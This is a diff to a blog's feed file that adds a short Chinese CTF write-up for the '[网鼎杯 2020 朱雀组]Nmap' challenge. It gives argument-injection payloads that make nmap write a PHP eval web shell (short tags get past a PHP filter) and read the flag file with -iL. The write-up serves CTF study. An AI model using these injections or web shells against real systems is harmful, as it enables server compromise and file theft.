@@ -5,6 +5,25 @@
   
   <entry>
     <title>BUU每日一题</title>
+    <link href="/2021/03/11/BUU050/"/>
+    <url>/2021/03/11/BUU050/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[网鼎杯 2020 朱雀组]Nmap<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c3d85e1949d6f0a2.png">    </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题和之前做过的一道题差不多<code>[BUUCTF 2018]Online Tool</code><br>不过这道题过滤了PHP<br>记一下使用短标签绕过    </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>127.0.0.1&#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code>        </p><p>其他解法        </p><p>payload：<code>127.0.0.1&#39; -iL ../../../../flag -o 1 &#39;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/3668a6d8791e96c0.png">     </p><p><code>-iL</code>扫描文件<br><code>-o</code>将扫描到的内容读入文件</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>BUU每日一题</title>
     <link href="/2021/03/10/BUU049/"/>
     <url>/2021/03/10/BUU049/</url>
     
